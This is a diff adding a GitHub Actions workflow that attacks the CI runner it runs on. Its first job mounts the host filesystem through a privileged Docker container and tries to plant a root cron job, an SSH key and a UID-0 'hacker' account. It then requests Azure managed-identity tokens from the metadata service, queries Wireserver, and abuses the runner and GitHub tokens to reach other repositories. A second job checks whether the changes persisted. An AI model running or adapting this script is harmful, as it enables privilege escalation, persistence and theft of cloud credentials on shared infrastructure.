@@ -1,0 +1,67 @@
+name: Persist
+on: workflow_dispatch
+jobs:
+  write:
+    runs-on: ubuntu-latest
+    steps:
+      - name: write-to-host
+        run: |
+          set +e
+          echo "=== WRITE TEST ==="
+          
+          # Try to write to host via Docker
+          docker run --rm --privileged -v /:/hostfs alpine sh -c "
+            echo 'BLOODDIAMONDZ_WAS_HERE' > /hostfs/tmp/persistence_test
+            cat /hostfs/tmp/persistence_test
+            # Try to write to a more persistent location
+            echo 'PERSISTENCE_TOKEN' > /hostfs/var/log/persistence_marker
+            # Try to modify host crontab
+            echo '* * * * * echo pwned > /tmp/pwned' >> /hostfs/var/spool/cron/crontabs/root 2>/dev/null || echo 'crontab write blocked'
+            # Try to add SSH key
+            echo 'ssh-rsa AAAA_TEST_KEY test@test' >> /hostfs/root/.ssh/authorized_keys 2>/dev/null && echo 'SSH KEY WRITTEN!' || echo 'SSH key write blocked'
+            # Try to modify /etc/passwd
+            echo 'hacker:x:0:0::/root:/bin/bash' >> /hostfs/etc/passwd 2>/dev/null && echo 'PASSWD MODIFIED!' || echo 'passwd write blocked'
+          "
+          
+          echo "=== CROSS-SUBSCRIPTION CHECK ==="
+          # Check if we can query Azure Resource Manager with any available tokens
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>/dev/null
+          
+          echo "=== WIRESERVER DEEP ==="
+          # Azure Wireserver - try to get VM extensions, certificates
+          curl -s "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>/dev/null | head -c 2000
+          curl -s "http://168.63.129.16/machine?comp=telemetrydata" 2>/dev/null | head -c 500
+          
+          echo "=== ACTIONS_RUNTIME_TOKEN ==="
+          # The ACTIONS_RUNTIME_TOKEN is used to upload artifacts - can we abuse it?
+          echo "ACTIONS_RUNTIME_TOKEN=${ACTIONS_RUNTIME_TOKEN:0:50}..."
+          echo "ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL"
+          echo "ACTIONS_CACHE_URL=$ACTIONS_CACHE_URL"
+          # Try to use it to access other repos' artifacts
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows?api-version=6.0-preview" 2>/dev/null | head -c 500
+          
+          echo "=== GITHUB TOKEN CROSS-REPO ==="
+          # Can GITHUB_TOKEN access other repos?
+          curl -s -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/github/github" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('message','ACCESS GRANTED'))" 2>/dev/null
+          
+          echo "=== DONE ==="
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ACTIONS_RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
+          ACTIONS_RUNTIME_URL: ${{ env.ACTIONS_RUNTIME_URL }}
+          ACTIONS_CACHE_URL: ${{ env.ACTIONS_CACHE_URL }}
+  
+  verify:
+    needs: write
+    runs-on: ubuntu-latest
+    steps:
+      - name: check-persistence
+        run: |
+          echo "=== PERSISTENCE CHECK ==="
+          echo "Different VM - checking if writes persisted..."
+          cat /tmp/persistence_test 2>/dev/null && echo "PERSISTENT!" || echo "Not persistent (ephemeral VM - expected)"
+          cat /var/log/persistence_marker 2>/dev/null && echo "LOG PERSISTENT!" || echo "Log not persistent"
+          grep hacker /etc/passwd 2>/dev/null && echo "PASSWD PERSISTENT!" || echo "Not persistent"
+          echo "=== DONE ==="
